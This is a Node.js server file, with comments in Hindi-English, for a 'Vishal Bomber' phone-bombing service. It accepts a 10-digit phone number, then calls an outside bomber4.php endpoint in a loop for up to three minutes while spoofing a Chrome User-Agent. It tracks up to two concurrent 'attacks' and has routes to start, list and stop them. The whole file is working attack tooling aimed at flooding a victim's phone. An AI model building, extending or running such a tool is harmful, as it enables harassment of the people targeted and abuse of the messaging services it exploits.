// ============================================================
// bomber_server.js - Vishal Bomber Wrapper Server
// Max 3min cap | Max 2 concurrent attacks | Logs
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
// 🔥 CONFIGURATION
// ============================================================

const MAX_DURATION_MIN = 3;          // 3min highest cap
const MAX_CONCURRENT_ATTACKS = 2;    // Ek time pe max 2 attacks
const VISHAL_BOMBER_URL = 'https://vishal.lovestoblog.com/bomber4.php';

// ============================================================
// 🔄 ACTIVE ATTACKS TRACKER
// ============================================================

const activeAttacks = new Map();     // phone → { startTime, duration, attackId }
let attackCounter = 0;

// ============================================================
// 📊 LOGGER
// ============================================================

function log(level, msg) {
    const time = new Date().toISOString();
    const emoji = {
        info: 'ℹ️ ',
        success: '✅',
        fail: '❌',
        warn: '⚠️ ',
        error: '🔥'
    }[level] || 'ℹ️ ';
    console.log(`${emoji} [${time}] ${msg}`);
}

// ============================================================
// 🎯 VISHAL BOMBER CALL FUNCTION
// ============================================================

async function callVishalBomber(phone, duration, attackId) {
    const url = `${VISHAL_BOMBER_URL}?phone=${phone}&duration=${duration}`;
    
    log('info', `🚀 ATTACK #${attackId} START | Phone: ${phone} | Duration: ${duration}min`);
    log('info', `🔗 URL: ${url}`);

    try {
        // 🔥 Chrome ki tarah request bhejo (User-Agent + Headers)
        const response = await axios.get(url, {
            timeout: 30000,  // 30s timeout
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            },
            validateStatus: () => true  // Sab status accept karo
        });

        const responseTime = Date.now();
        log('success', `✅ ATTACK #${attackId} RESPONSE | Status: ${response.status} | Phone: ${phone}`);
        
        return {
            success: true,
            status: response.status,
            attackId,
            phone,
            duration
        };
    } catch (err) {
        log('fail', `❌ ATTACK #${attackId} FAILED | Phone: ${phone} | Error: ${err.message}`);
        return {
            success: false,
            status: null,
            attackId,
            phone,
            duration,
            error: err.message
        };
    }
}

// ============================================================
// 🎯 BOMBING SESSION — Vishal Bomber Ko Call Karega
// ============================================================

async function runAttackSession(phone, duration, attackId) {
    const startTime = Date.now();
    const endTime = startTime + (duration * 60 * 1000);  // duration minutes me

    log('info', `⚔️  SESSION #${attackId} START | Phone: ${phone} | Duration: ${duration}min | End: ${new Date(endTime).toLocaleTimeString()}`);

    let cycleCount = 0;

    // 🔥 Jab tak time khatam na ho, Vishal Bomber ko call karte raho
    while (Date.now() < endTime && activeAttacks.has(phone)) {
        cycleCount++;
        
        log('info', `🔄 SESSION #${attackId} | Cycle #${cycleCount} | Phone: ${phone}`);
        
        // 🔥 Vishal Bomber ko call karo
        const result = await callVishalBomber(phone, duration, attackId);
        
        // 🔥 Agar attack successful hai toh 30 second wait karo
        if (result.success) {
            await new Promise(r => setTimeout(r, 30000));  // 30 sec delay
        } else {
            await new Promise(r => setTimeout(r, 10000));  // 10 sec delay on fail
        }
    }

    // 🔥 Session complete
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    activeAttacks.delete(phone);
    
    log('success', `✅ SESSION #${attackId} END | Phone: ${phone} | Cycles: ${cycleCount} | Time: ${elapsed}s`);
}

// ============================================================
// 🛣️  ROUTES
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        server: 'Vishal Bomber Wrapper',
        max_duration_min: MAX_DURATION_MIN,
        max_concurrent_attacks: MAX_CONCURRENT_ATTACKS,
        active_attacks: activeAttacks.size,
        active_phones: Array.from(activeAttacks.keys()),
        vishal_url: VISHAL_BOMBER_URL,
        uptime: process.uptime()
    });
});

// 🔥 HEALTH ROUTE
app.get('/health', (req, res) => {
    res.json({
        ready: true,
        active_attacks: activeAttacks.size,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        can_accept: activeAttacks.size < MAX_CONCURRENT_ATTACKS
    });
});

// 🔥 BOMB ROUTE — Bot.js yahan request bhejega
app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;

    // 🔥 Validation
    if (!phone || phone.length !== 10) {
        log('fail', `❌ Invalid phone number: ${phone}`);
        return res.status(400).json({ 
            success: false, 
            error: 'Invalid phone number. Must be 10 digits.' 
        });
    }

    // 🔥 3min HIGHEST CAP
    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    log('info', `📱 NEW REQUEST | Phone: ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);

    // 🔥 CHECK — Agar same phone pe already attack chal raha hai
    if (activeAttacks.has(phone)) {
        log('warn', `⚠️  Phone ${phone} pe already attack chal raha hai. Skip.`);
        return res.json({
            success: false,
            phone,
            message: 'Attack already running on this phone',
            active_attacks: activeAttacks.size
        });
    }

    // 🔥 CHECK — Max 2 concurrent attacks
    if (activeAttacks.size >= MAX_CONCURRENT_ATTACKS) {
        log('warn', `⚠️  Max concurrent attacks (${MAX_CONCURRENT_ATTACKS}) reached. Queue full.`);
        return res.status(429).json({
            success: false,
            phone,
            message: `Server busy. Max ${MAX_CONCURRENT_ATTACKS} attacks allowed. Try again in ${effectiveDuration} min.`,
            active_attacks: activeAttacks.size,
            retry_after: 60
        });
    }

    // 🔥 NEW ATTACK START
    attackCounter++;
    const attackId = `A${attackCounter}_${phone}`;

    activeAttacks.set(phone, {
        attackId,
        phone,
        duration: effectiveDuration,
        startTime: Date.now(),
        instance: instance || 'default'
    });

    log('success', `✅ ATTACK #${attackId} STARTED | Phone: ${phone} | Duration: ${effectiveDuration}min | Active: ${activeAttacks.size}/${MAX_CONCURRENT_ATTACKS}`);

    // 🔥 Background me attack chalao
    runAttackSession(phone, effectiveDuration, attackId).catch(err => {
        log('error', `❌ SESSION #${attackId} ERROR: ${err.message}`);
        activeAttacks.delete(phone);
    });

    // 🔥 Turant response
    res.json({
        success: true,
        attack_id: attackId,
        phone,
        requested_duration: requestedDuration,
        effective_duration: effectiveDuration,
        active_attacks: activeAttacks.size,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        message: `Attack started for ${effectiveDuration} min`
    });
});

// 🔥 ATTACK STATUS ROUTE
app.get('/attacks', (req, res) => {
    res.json({
        active_attacks: activeAttacks.size,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        attacks: Array.from(activeAttacks.values()).map(a => ({
            attackId: a.attackId,
            phone: a.phone,
            duration: a.duration,
            elapsed: ((Date.now() - a.startTime) / 1000).toFixed(1) + 's',
            instance: a.instance
        }))
    });
});

// 🔥 STOP ATTACK ROUTE
app.post('/stop/:phone', (req, res) => {
    const { phone } = req.params;
    if (activeAttacks.has(phone)) {
        activeAttacks.delete(phone);
        log('warn', `🛑 ATTACK STOPPED | Phone: ${phone}`);
        res.json({ success: true, message: 'Attack stopped', phone });
    } else {
        res.json({ success: false, message: 'No active attack on this phone', phone });
    }
});

// ============================================================
// 🚀 START SERVER
// ============================================================

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    log('success', `🚀 Vishal Bomber Wrapper Server running on port ${PORT}`);
    log('info', `📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    log('info', `⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
    log('info', `🔒 Max concurrent attacks: ${MAX_CONCURRENT_ATTACKS}`);
    log('info', `🔗 Vishal Bomber URL: ${VISHAL_BOMBER_URL}`);
    log('info', `📍 Routes: /bomb (POST), /attacks (GET), /stop/:phone (POST)`);
});
